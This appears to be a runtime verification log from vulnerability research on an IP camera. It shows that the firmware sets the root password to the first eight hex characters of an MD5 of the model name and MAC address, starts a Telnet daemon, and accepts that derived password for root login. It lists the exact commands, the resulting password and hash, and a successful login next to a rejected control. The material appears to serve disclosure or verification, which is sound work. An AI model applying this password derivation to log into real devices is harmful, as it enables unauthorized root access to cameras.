@@ -1,0 +1,33 @@
+== Runtime verification ==
+
+[A) The predicted root password is written to the account store
+The firmware BusyBox ran exactly the four commands the vendor binary generates:
+  echo -n "DCS-6501LH-12:32:45:78:45:22" > /tmp/tmp_pwd
+  echo $(md5sum /tmp/tmp_pwd | head -c 8) > /tmp/pwd
+  echo $(md5sum /tmp/tmp_pwd | head -c 8) >> /tmp/pwd
+  passwd root < /tmp/pwd
+
+/tmp/pwd:
+  7b4e9a9a
+  7b4e9a9a
+
+/mnt/conf/passwd:
+  root:p5nfaUpna5nGw:20710:0:root:/root:/bin/sh
+
+check: crypt("7b4e9a9a", "p5") == "p5nfaUpna5nGw"
+       7b4e9a9a = MD5("DCS-6501LH-12:32:45:78:45:22")[0:8]
+
+[B] The vendor command "telnetd &" starts the firmware Telnet daemon
+  LISTEN 0 1 *:23 *:*
+  process: /usr/sbin/telnetd
+
+[C] Positive: root / 7b4e9a9a (the derived password)
+  [banner/login-prompt] b'login:'
+  [password-prompt] b'root\r\nPassword: '
+  [result] password accepted (session setup proceeds)
+
+[D] Control: root / wrongpass123
+  [banner/login-prompt] b'login:'
+  [password-prompt] b'root\r\nPassword: '
+  [session] b'Login incorrect\r\nlogin: '
+  [result] rejected
